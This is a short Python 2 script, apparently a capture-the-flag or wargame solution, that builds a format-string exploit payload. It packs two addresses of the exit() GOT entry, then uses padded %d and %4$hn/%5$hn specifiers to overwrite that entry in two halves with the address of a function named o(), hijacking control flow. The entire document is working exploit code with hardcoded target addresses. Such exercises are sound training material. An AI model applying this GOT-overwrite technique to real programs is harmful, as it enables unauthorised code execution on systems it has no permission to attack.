#!/usr/bin/python
import struct

# Target address: GOT entry for exit()
exit_got = 0x08049838  # The address you found for exit@plt

# Address of o() function we want to redirect to
o_func = 0x080484a4

# Split o_func address into two 2-byte parts
lower_bytes = o_func & 0xFFFF         # 0x84a4
upper_bytes = (o_func >> 16) & 0xFFFF # 0x0804

# Create payload
payload = ""
payload += struct.pack("I", exit_got)     # For writing lower bytes
payload += struct.pack("I", exit_got + 2) # For writing upper bytes

# Calculate the required padding
# First write: need to print 0x84a4 (33956) characters
first_padding = 33956 - 8  # Subtracting 8 for the two addresses we already printed

# Second write: need to write 0x0804 (2052) after modulo 65536
# After printing 33956, we need to print (65536 + 2052 - 33956) = 33632 more
second_padding = (0x10000 + upper_bytes) - lower_bytes

# Build format string
payload += "%" + str(first_padding) + "d" + "%4$hn"  # Write lower bytes
payload += "%" + str(second_padding) + "d" + "%5$hn" # Write upper bytes

# Print payload
print payload

